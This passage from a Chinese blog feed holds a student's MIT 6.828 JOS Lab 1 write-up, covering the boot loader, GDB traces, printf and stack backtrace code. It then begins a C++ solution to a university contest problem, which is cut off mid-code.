class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Switch from real to protected mode, using a bootstrap GDT</span><br><span class="line"># and segment translation that makes virtual addresses </span><br><span class="line"># identical to their physical addresses, so that the </span><br><span class="line"># effective memory map does not change during the switch.</span><br><span class="line">lgdt    gdtdesc</span><br><span class="line">movl    %cr0, %eax</span><br><span class="line">orl     $CR0_PE_ON, %eax</span><br><span class="line">movl    %eax, %cr0</span><br><span class="line"></span><br><span class="line"># Jump to next instruction, but in 32-bit code segment.</span><br><span class="line"># Switches processor into 32-bit mode.</span><br><span class="line">ljmp    $PROT_MODE_CSEG, $protcseg</span><br></pre></td></tr></table></figure><p>bios启动以后进入引导程序，一开始是16位实模式，到这里用lgdt加载了段描述符表gdtdesc,然后把CR0_PE设置成CR0_PE_ON来设置成等待开启保护模式的状态，这个状态的变化依赖于某个段寄存器的改变，这里利用ljmp来改变%cs寄存器，这时处理器读取gdt然后改变内部设置。因为gdtdesc中指定了是32位模式，所以从ljmp跳转过去以后就是32位模式了。</p><ol start="2"><li>最后一条指令显然是7d5f处的jump</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7d5f:eb e6                jmp    7d47 &lt;bootmain+0x3d&gt;</span><br></pre></td></tr></table></figure><p>第一条kernel指令则是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f010000c:66 c7 05 72 04 00 00 movw   $0x1234,0x472</span><br></pre></td></tr></table></figure><ol start="3"><li>在0x100000c处，不是0xf010000c处</li><li>应该是从硬盘的第一个页中读取了elf的头，这个头里面记录了后面应该读取多少扇区</li></ol><h2 id="Loading-the-Kernel"><a href="#Loading-the-Kernel" class="headerlink" title="Loading the Kernel"></a>Loading the Kernel</h2><h3 id="Exercise-4"><a href="#Exercise-4" class="headerlink" title="Exercise 4"></a>Exercise 4</h3><blockquote><p>Exercise 4. Read about programming with pointers in C. The best reference for the C language is <em>The C Programming Language</em> by Brian Kernighan and Dennis Ritchie (known as ‘K&amp;R’). We recommend that students purchase this book (here is an <a href="http://www.amazon.com/C-Programming-Language-2nd/dp/0131103628/sr=8-1/qid=1157812738/ref=pd_bbs_1/104-1502762-1803102?ie=UTF8&s=books" target="_blank" rel="noopener">Amazon Link</a>) or find one of<a href="http://library.mit.edu/F/AI9Y4SJ2L5ELEE2TAQUAAR44XV5RTTQHE47P9MKP5GQDLR9A8X-10422?func=item-global&doc_library=MIT01&doc_number=000355242&year=&volume=&sub_library=" target="_blank" rel="noopener">MIT’s 7 copies</a>.</p><p>Read 5.1 (Pointers and Addresses) through 5.5 (Character Pointers and Functions) in K&amp;R. Then download the code for <a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/pointers.c" target="_blank" rel="noopener">pointers.c</a>, run it, and make sure you understand where all of the printed values come from. In particular, make sure you understand where the pointer addresses in printed lines 1 and 6 come from, how all the values in printed lines 2 through 4 get there, and why the values printed in line 5 are seemingly corrupted.</p><p>There are other references on pointers in C (e.g., <a href="https://pdos.csail.mit.edu/6.828/2018/readings/pointers.pdf" target="_blank" rel="noopener">A tutorial by Ted Jensen</a> that cites K&amp;R heavily), though not as strongly recommended.</p><p>Warning:Unless you are already thoroughly versed in C, do not skip or even skim this reading exercise. If you do not really understand pointers in C, you will suffer untold pain and misery in subsequent labs, and then eventually come to understand them the hard way. Trust us; you don’t want to find out what “the hard way” is.</p></blockquote><p>pass</p><h3 id="Exercise-5"><a href="#Exercise-5" class="headerlink" title="Exercise 5"></a>Exercise 5</h3><blockquote><p>Exercise 5. Trace through the first few instructions of the boot loader again and identify the first instruction that would “break” or otherwise do the wrong thing if you were to get the boot loader’s link address wrong. Then change the link address in <code>boot/Makefrag</code> to something wrong, run make clean, recompile the lab with make, and trace into the boot loader again to see what happens. Don’t forget to change the link address back and make clean again afterward!</p></blockquote><p>实测会不断地重启然后屏幕里面不断地刷出提示符</p><h3 id="Exercise-6"><a href="#Exercise-6" class="headerlink" title="Exercise 6"></a>Exercise 6</h3><blockquote><p>Exercise 6. We can examine memory using GDB’s x command. The <a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Memory.html" target="_blank" rel="noopener">GDB manual</a> has full details, but for now, it is enough to know that the command x/<em>N</em>x <em>ADDR</em> prints <em>N</em> words of memory at <em>ADDR</em>. (Note that both ‘<code>x</code>‘s in the command are lowercase.) <em>Warning</em>: The size of a word is not a universal standard. In GNU assembly, a word is two bytes (the ‘w’ in xorw, which stands for word, means 2 bytes).</p><p>Reset the machine (exit QEMU/GDB and start them again). Examine the 8 words of memory at 0x00100000 at the point the BIOS enters the boot loader, and then again at the point the boot loader enters the kernel. Why are they different? What is there at the second breakpoint? (You do not really need to use QEMU to answer this question. Just think.)</p></blockquote><p>首先打个断点在0x7c00然后随便走两步之后看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/8x 0x100000</span><br><span class="line">0x100000:       0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x100010:       0x00000000      0x00000000      0x00000000      0x00000000</span><br></pre></td></tr></table></figure><p>然后进入内核(打个断点在0x7d61，也就是call entry的地方，然后走一步就到了kernel)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/8x 0x100000</span><br><span class="line">0x100000:       0x1badb002      0x00000000      0xe4524ffe      0x7205c766</span><br><span class="line">0x100010:       0x34000004      0x0000b812      0x220f0011      0xc0200fd8</span><br></pre></td></tr></table></figure><p>实际上都没必要看，一开始没有加载的时候肯定啥都没有，进入内核了肯定都加载了，就有数据了嘛。这里应该是内核部分的代码，因为当前执行的指令也在这个区域附近。</p><h3 id="Exercise-7"><a href="#Exercise-7" class="headerlink" title="Exercise 7"></a>Exercise 7</h3><blockquote><p>Exercise 7. Use QEMU and GDB to trace into the JOS kernel and stop at the <code>movl %eax, %cr0</code>. Examine memory at 0x00100000 and at 0xf0100000. Now, single step over that instruction using the stepi GDB command. Again, examine memory at 0x00100000 and at 0xf0100000. Make sure you understand what just happened.</p><p>What is the first instruction <em>after</em> the new mapping is established that would fail to work properly if the mapping weren’t in place? Comment out the <code>movl %eax, %cr0</code> in <code>kern/entry.S</code>, trace into it, and see if you were right.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x100025:    mov    %eax,%cr0</span><br><span class="line">0x00100025 in ?? ()</span><br><span class="line">(gdb) x/8i 0x100000</span><br><span class="line">   0x100000:    add    0x1bad(%eax),%dh</span><br><span class="line">   0x100006:    add    %al,(%eax)</span><br><span class="line">   0x100008:    decb   0x52(%edi)</span><br><span class="line">   0x10000b:    in     $0x66,%al</span><br><span class="line">   0x10000d:    movl   $0xb81234,0x472</span><br><span class="line">   0x100017:    add    %dl,(%ecx)</span><br><span class="line">   0x100019:    add    %cl,(%edi)</span><br><span class="line">   0x10001b:    and    %al,%bl</span><br><span class="line">(gdb) si</span><br><span class="line">=&gt; 0x100028:    mov    $0xf010002f,%eax</span><br><span class="line">0x00100028 in ?? ()</span><br><span class="line">(gdb) x/8i 0xf0100000</span><br><span class="line">   0xf0100000 &lt;_start+4026531828&gt;:      add    0x1bad(%eax),%dh</span><br><span class="line">   0xf0100006 &lt;_start+4026531834&gt;:      add    %al,(%eax)</span><br><span class="line">   0xf0100008 &lt;_start+4026531836&gt;:      decb   0x52(%edi)</span><br><span class="line">   0xf010000b &lt;_start+4026531839&gt;:      in     $0x66,%al</span><br><span class="line">   0xf010000d &lt;entry+1&gt;:        movl   $0xb81234,0x472</span><br><span class="line">   0xf0100017 &lt;entry+11&gt;:       add    %dl,(%ecx)</span><br><span class="line">   0xf0100019 &lt;entry+13&gt;:       add    %cl,(%edi)</span><br><span class="line">   0xf010001b &lt;entry+15&gt;:       and    %al,%bl</span><br><span class="line">(gdb) x/8i 0x100000</span><br><span class="line">   0x100000:    add    0x1bad(%eax),%dh</span><br><span class="line">   0x100006:    add    %al,(%eax)</span><br><span class="line">   0x100008:    decb   0x52(%edi)</span><br><span class="line">   0x10000b:    in     $0x66,%al</span><br><span class="line">   0x10000d:    movl   $0xb81234,0x472</span><br><span class="line">   0x100017:    add    %dl,(%ecx)</span><br><span class="line">   0x100019:    add    %cl,(%edi)</span><br><span class="line">   0x10001b:    and    %al,%bl</span><br></pre></td></tr></table></figure><p>这个很明显，执行了movl %eax, %cr0之后有了从0x100000到0xf0100000的某种映射。</p><p>注释掉以后在第一次jump之后运行便出错了，猜测是因为没有建立这种映射导致执行的位置并没有代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x10002a:    jmp    *%eax</span><br><span class="line">0x0010002a in ?? ()</span><br><span class="line">(gdb) si</span><br><span class="line">=&gt; 0xf010002c &lt;relocated&gt;:      add    %al,(%eax)</span><br><span class="line">relocated () at kern/entry.S:74</span><br><span class="line">74              movl    $0x0,%ebp                       # nuke frame pointer</span><br><span class="line">(gdb) si</span><br><span class="line">Remote connection closed</span><br></pre></td></tr></table></figure><h3 id="Exercise-8"><a href="#Exercise-8" class="headerlink" title="Exercise 8"></a>Exercise 8</h3><blockquote><p>Exercise 8. We have omitted a small fragment of code - the code necessary to print octal numbers using patterns of the form “%o”. Find and fill in this code fragment.</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</span><br><span class="line"><span class="comment">// Replace this with your code.</span></span><br><span class="line">num=getuint(&amp;ap,lflag);</span><br><span class="line">base=<span class="number">8</span>;</span><br><span class="line"><span class="keyword">goto</span> number;</span><br></pre></td></tr></table></figure><p>我直接照着%u的写，貌似运行还比较正常</p><p>对于给出的6个问题其实很好回答。</p><ol><li>console.c导出了cputchar,printf.c利用cputchar和vcprintfmt实现各种功能。</li><li>CRT_SIZE表示console能显示的最大长度，如果当前的内容超过了这个长度，那么就要把所有内容向上移动一行，然后把最后一行的剩余位置变成空，也就是’ ‘.</li><li>略</li><li>输出”He110 World”,第一个是十六进制转10进制，第二个因为intel是小端法，低位在低地址，所以得从后往前看，比如0x72对应114就是ascii中的’r’。</li><li>感觉上第二个值应该是3对应位置的后一个位置吧,反正输出肯定是不确定的。</li><li>修改va_start和va_end</li></ol><h3 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h3><blockquote><p>Enhance the console to allow text to be printed in different colors. The traditional way to do this is to make it interpret <a href="http://rrbrandt.dee.ufcg.edu.br/en/docs/ansi/" target="_blank" rel="noopener">ANSI escape sequences</a> embedded in the text strings printed to the console, but you may use any mechanism you like. There is plenty of information on <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html" target="_blank" rel="noopener">the 6.828 reference page</a> and elsewhere on the web on programming the VGA display hardware. If you’re feeling really adventurous, you could try switching the VGA hardware into a graphics mode and making the console draw text onto the graphical frame buffer.</p></blockquote><p>挖坑，以后再做</p><h2 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h2><blockquote><p>Determine where the kernel initializes its stack, and exactly where in memory its stack is located. How does the kernel reserve space for its stack? And at which “end” of this reserved area is the stack pointer initialized to point to?</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movl    $(bootstacktop),%esp</span><br></pre></td></tr></table></figure><p>这里把bootstacktop设置到了esp初始化了栈位置,后一个问题我没太看懂问的啥。</p><h3 id="Exercise-10"><a href="#Exercise-10" class="headerlink" title="Exercise 10"></a>Exercise 10</h3><blockquote><p>To become familiar with the C calling conventions on the x86, find the address of the <code>test_backtrace</code> function in <code>obj/kern/kernel.asm</code>, set a breakpoint there, and examine what happens each time it gets called after the kernel starts. How many 32-bit words does each recursive nesting level of <code>test_backtrace</code> push on the stack, and what are those words?</p><p>Note that, for this exercise to work properly, you should be using the patched version of QEMU available on the <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html" target="_blank" rel="noopener">tools</a> page or on Athena. Otherwise, you’ll have to manually translate all breakpoint and memory addresses to linear addresses.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">test_backtrace(int x)</span><br><span class="line">&#123;</span><br><span class="line">f0100040:55                   push   %ebp</span><br><span class="line">f0100041:89 e5                mov    %esp,%ebp</span><br><span class="line">f0100043:53                   push   %ebx</span><br><span class="line">f0100044:83 ec 14             sub    $0x14,%esp</span><br><span class="line">f0100047:8b 5d 08             mov    0x8(%ebp),%ebx</span><br><span class="line">cprintf(&quot;entering test_backtrace %d\n&quot;, x);</span><br><span class="line">f010004a:89 5c 24 04          mov    %ebx,0x4(%esp)</span><br><span class="line">f010004e:c7 04 24 00 1a 10 f0 movl   $0xf0101a00,(%esp)</span><br><span class="line">f0100055:e8 75 09 00 00       call   f01009cf &lt;cprintf&gt;</span><br><span class="line">if (x &gt; 0)</span><br><span class="line">f010005a:85 db                test   %ebx,%ebx</span><br><span class="line">f010005c:7e 0d                jle    f010006b &lt;test_backtrace+0x2b&gt;</span><br><span class="line">test_backtrace(x-1);</span><br><span class="line">f010005e:8d 43 ff             lea    -0x1(%ebx),%eax</span><br><span class="line">f0100061:89 04 24             mov    %eax,(%esp)</span><br><span class="line">f0100064:e8 d7 ff ff ff       call   f0100040 &lt;test_backtrace&gt;</span><br><span class="line">f0100069:eb 1c                jmp    f0100087 &lt;test_backtrace+0x47&gt;</span><br><span class="line">else</span><br><span class="line">mon_backtrace(0, 0, 0);</span><br><span class="line">f010006b:c7 44 24 08 00 00 00 movl   $0x0,0x8(%esp)</span><br><span class="line">f0100072:00 </span><br><span class="line">f0100073:c7 44 24 04 00 00 00 movl   $0x0,0x4(%esp)</span><br><span class="line">f010007a:00 </span><br><span class="line">f010007b:c7 04 24 00 00 00 00 movl   $0x0,(%esp)</span><br><span class="line">f0100082:e8 18 07 00 00       call   f010079f &lt;mon_backtrace&gt;</span><br><span class="line">cprintf(&quot;leaving test_backtrace %d\n&quot;, x);</span><br><span class="line">f0100087:89 5c 24 04          mov    %ebx,0x4(%esp)</span><br><span class="line">f010008b:c7 04 24 1c 1a 10 f0 movl   $0xf0101a1c,(%esp)</span><br><span class="line">f0100092:e8 38 09 00 00       call   f01009cf &lt;cprintf&gt;</span><br><span class="line">&#125;</span><br><span class="line">f0100097:83 c4 14             add    $0x14,%esp</span><br><span class="line">f010009a:5b                   pop    %ebx</span><br><span class="line">f010009b:5d                   pop    %ebp</span><br><span class="line">f010009c:c3                   ret</span><br></pre></td></tr></table></figure><p>首先有一个sub 0x14,$esp这里是0x14字节，也就是5个32位字然后两个Push是两个字，然后call还会保存一个eip返回地址也是一个字，所以依次调用会有8个32位字进栈</p><h3 id="Exercise-11-amp-amp-12"><a href="#Exercise-11-amp-amp-12" class="headerlink" title="Exercise 11&amp;&amp;12"></a>Exercise 11&amp;&amp;12</h3><blockquote><p>Exercise 11. Implement the backtrace function as specified above. Use the same format as in the example, since otherwise the grading script will be confused. When you think you have it working right, run make grade to see if its output conforms to what our grading script expects, and fix it if it doesn’t. <em>After</em> you have handed in your Lab 1 code, you are welcome to change the output format of the backtrace function any way you like.</p></blockquote><blockquote><p>Exercise 12. Modify your stack backtrace function to display, for each <code>eip</code>, the function name, source file name, and line number corresponding to that <code>eip</code>.</p></blockquote><p>第一个得结合内存中栈的具体保存方式来看，主要是要找到ebp和eip的关系，以及和传入的变量的关系，借用一张别人的图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">|    ...    |</span><br><span class="line">|   args1   |</span><br><span class="line">|  ret  eip |</span><br><span class="line">| saved ebp | </span><br><span class="line">| saved ebx |</span><br><span class="line">|   args5   |</span><br><span class="line">|   args4   |</span><br><span class="line">|   args3   |</span><br><span class="line">|   args2   |</span><br><span class="line">|   args1   |</span><br><span class="line">|  ret  eip |</span><br><span class="line">| saved ebp | </span><br><span class="line">| saved ebx |</span><br><span class="line">|    ...    |</span><br></pre></td></tr></table></figure><p>那么显然每次找到ebp,然后按照位置去找对应的eip和变量即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">mon_backtrace(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Your code here.</span></span><br><span class="line">cprintf(<span class="string">"Stack backtrace:\n"</span>);</span><br><span class="line"><span class="keyword">uint32_t</span> *ebp=(<span class="keyword">uint32_t</span> *)read_ebp();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> <span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">while</span>(ebp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> *eip=ebp+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> flag=debuginfo_eip((<span class="keyword">uintptr_t</span>)*eip,&amp;info);</span><br><span class="line">cprintf(<span class="string">"  ebp %08x eip %08x args"</span>,ebp,*eip);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line">cprintf(<span class="string">" %08x"</span>,*(ebp+i+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">cprintf(<span class="string">"\n         %s:%d: %.*s+%d\n"</span>,info.eip_file , info.eip_line , info.eip_fn_namelen , info.eip_fn_name , (ebp[<span class="number">1</span>]-info.eip_fn_addr));</span><br><span class="line"></span><br><span class="line">ebp=(<span class="keyword">uint32_t</span> *)(*ebp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>练习12只需要看一看对应的struct Eipdebuginfo的结构即可，然后去实现kdebug.c中的残缺代码即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Search within [lline, rline] for the line number stab.</span></span><br><span class="line"><span class="comment">// If found, set info-&gt;eip_line to the right line number.</span></span><br><span class="line"><span class="comment">// If not found, return -1.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//There's a particular stabs type used for line numbers.</span></span><br><span class="line"><span class="comment">//Look at the STABS documentation and &lt;inc/stab.h&gt; to find</span></span><br><span class="line"><span class="comment">//which one.</span></span><br><span class="line"><span class="comment">// Your code here.</span></span><br><span class="line">info-&gt;eip_file=stabstr+stabs[lfile].n_strx;</span><br><span class="line">stab_binsearch(stabs,&amp;lline,&amp;rline,N_SLINE,addr);</span><br><span class="line"><span class="keyword">if</span>(lline&gt;rline)</span><br><span class="line">&#123;</span><br><span class="line">info-&gt;eip_line=stabs[rline].n_desc;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">info-&gt;eip_line=stabs[rline].n_desc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里得去看看STAB的结构，然后模仿前面的调用去查找即可。</p><p>最后评分:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">running JOS: (1.0s) </span><br><span class="line">  printf: OK </span><br><span class="line">  backtrace count: OK </span><br><span class="line">  backtrace arguments: OK </span><br><span class="line">  backtrace symbols: OK </span><br><span class="line">  backtrace lines: OK </span><br><span class="line">Score: 50/50</span><br></pre></td></tr></table></figure><p>需要特别注意的是，如果你不是按照他给出的步骤安装的他给的gcc或者用gcc4.8，即使是相同的代码，你可能也拿不到满分。这个实验对编译链的要求非常严格，建议自己折腾一下，完全符合他的要求。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Booting-a-PC&quot;&gt;&lt;a href=&quot;#Booting-a-PC&quot; class=&quot;headerlink&quot; title=&quot;Booting a PC&quot;&gt;&lt;/a&gt;Booting a PC&lt;/h1&gt;&lt;p&gt;因为觉得这东西比较难，主要是比较繁琐，还是参考CSAPP的样
      
    
    </summary>
    
      <category term="mit6.828 Lab" scheme="lengyu.me/categories/mit6-828-Lab/"/>
    
    
      <category term="operating system" scheme="lengyu.me/tags/operating-system/"/>
    
      <category term="mit6.828" scheme="lengyu.me/tags/mit6-828/"/>
    
  </entry>
  
  <entry>
    <title>2018校赛初赛题解</title>
    <link href="lengyu.me/2018/10/21/2018%E6%A0%A1%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
    <id>lengyu.me/2018/10/21/2018校赛初赛题解/</id>
    <published>2018-10-21T14:26:12.000Z</published>
    <updated>2019-07-28T15:41:39.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="谁是单身狗"><a href="#谁是单身狗" class="headerlink" title="谁是单身狗"></a>谁是单身狗</h1><h2 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h2><p>大魔王捉住了N个人，让他们每个人分别说出其他人是单身狗还是现充，并扬言要吃掉所有现充。已知这N个人中单身狗比现充多，所有单身狗都是单身狗协会的成员且相互认识，所有现充都不认识其他人。在大魔王的淫威之下，所有单身狗都如实指出了其他人的身份，所有人出于害怕都说自己是单身狗。由于现充们不认识其他人，所以在指认他人身份的时候都只会乱说一通。聪明的魔王百分百准确地判断出了哪些人是单身狗、哪些人是现充，然后把所有现充都吃掉了。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我们假设集合$Q_i$是第$i$个人对别人的指认的集合，因为单身狗比现充(现充是啥)多，那么我们只需要对照找出集合$Q$出现最多的那种集合，就是单身狗集合。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">10005</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;dt[maxn];</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;mp;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n))</span><br><span class="line">&#123;</span><br><span class="line">mp.clear();</span><br><span class="line"><span class="keyword">int</span> mx=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> mi=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line">dt[i].clear();</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a);</span><br><span class="line"><span class="keyword">if</span>(a==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">dt[i].push_back(j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(mp.count(dt[i].size())==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">mp[dt[i].size()]=<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">mp[dt[i].size()]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(mp[dt[i].size()]&gt;mx)</span><br><span class="line">&#123;</span><br><span class="line">mx=mp[dt[i].size()];</span><br><span class="line">mi=i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dt[mi].size();++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,dt[mi][i]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" 